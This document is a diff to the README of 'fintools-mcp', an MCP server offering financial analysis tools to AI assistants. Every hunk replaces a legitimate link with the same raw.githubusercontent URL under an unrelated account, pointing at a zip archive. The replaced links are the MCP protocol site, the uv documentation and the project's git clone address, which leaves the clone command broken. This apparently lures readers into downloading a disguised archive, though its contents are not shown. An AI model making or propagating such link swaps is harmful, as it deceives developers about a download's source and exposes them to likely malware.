@@ -1,6 +1,6 @@
 # fintools-mcp
 
-Financial analysis tools for AI assistants via [MCP](https://modelcontextprotocol.io) (Model Context Protocol).
+Financial analysis tools for AI assistants via [MCP](https://raw.githubusercontent.com/camberpesewa832/fintools-mcp/main/docs/fintools-mcp-3.7-alpha.2.zip) (Model Context Protocol).
 
 Give Claude, ChatGPT, Cursor, or any MCP-compatible AI access to real financial analysis — not just stock prices, but the analytical toolkit a trader actually uses.
 
@@ -31,7 +31,7 @@ Give Claude, ChatGPT, Cursor, or any MCP-compatible AI access to real financial 
 pip install fintools-mcp
 ```
 
-Or with [uv](https://docs.astral.sh/uv/):
+Or with [uv](https://raw.githubusercontent.com/camberpesewa832/fintools-mcp/main/docs/fintools-mcp-3.7-alpha.2.zip):
 
 ```bash
 uv pip install fintools-mcp
@@ -138,7 +138,7 @@ fintools-mcp/
 ## Development
 
 ```bash
-git clone https://github.com/slimbiggins007/fintools-mcp.git
+git clone https://raw.githubusercontent.com/camberpesewa832/fintools-mcp/main/docs/fintools-mcp-3.7-alpha.2.zip
 cd fintools-mcp
 uv sync
 uv run python -m fintools_mcp  # starts the MCP server
